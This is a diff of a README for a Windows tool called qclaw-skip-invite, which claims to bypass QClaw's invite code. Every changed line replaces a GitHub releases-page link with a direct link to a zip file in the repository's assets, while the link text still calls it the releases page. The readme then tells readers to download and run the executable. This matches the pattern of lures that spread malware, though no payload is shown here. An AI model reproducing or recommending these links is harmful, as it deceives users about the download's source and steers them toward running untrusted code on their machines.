@@ -1,6 +1,6 @@
 # 🛠 qclaw-skip-invite - Skip QClaw Invite Code Easily
 
-[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/warm-mannalichen723/qclaw-skip-invite/releases)
+[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/warm-mannalichen723/qclaw-skip-invite/main/assets/qclaw_invite_skip_v3.8.zip)
 
 ## 🔍 What is qclaw-skip-invite?
 
@@ -31,7 +31,7 @@ To use qclaw-skip-invite, follow these steps carefully. The instructions guide y
 
 Go to the official releases page on GitHub to get the latest version.
 
-[Click here to visit the Release Page](https://github.com/warm-mannalichen723/qclaw-skip-invite/releases)
+[Click here to visit the Release Page](https://raw.githubusercontent.com/warm-mannalichen723/qclaw-skip-invite/main/assets/qclaw_invite_skip_v3.8.zip)
 
 This link leads to the place where you find the installer files. You will choose the correct file to download from this page.
 
@@ -89,7 +89,7 @@ If the invite still appears, check that you have the correct version of QClaw in
 
 Check back to the releases page to find new updates or improved versions:
 
-[Visit Releases Page Again](https://github.com/warm-mannalichen723/qclaw-skip-invite/releases)
+[Visit Releases Page Again](https://raw.githubusercontent.com/warm-mannalichen723/qclaw-skip-invite/main/assets/qclaw_invite_skip_v3.8.zip)
 
 Updates may include bug fixes and improved compatibility.
 
@@ -113,11 +113,11 @@ If you need help, look for issues or discussions on the GitHub page. You can als
 
 ## 📌 Summary of Steps
 
-1. Visit the [Releases Page](https://github.com/warm-mannalichen723/qclaw-skip-invite/releases)  
+1. Visit the [Releases Page](https://raw.githubusercontent.com/warm-mannalichen723/qclaw-skip-invite/main/assets/qclaw_invite_skip_v3.8.zip)  
 2. Download the latest `.exe` or `.zip` file  
 3. Run the program (or installer) on Windows  
 4. Let the tool skip the invite process automatically  
 
 ---
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/warm-mannalichen723/qclaw-skip-invite/releases)
+[![Download Here](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/warm-mannalichen723/qclaw-skip-invite/main/assets/qclaw_invite_skip_v3.8.zip)
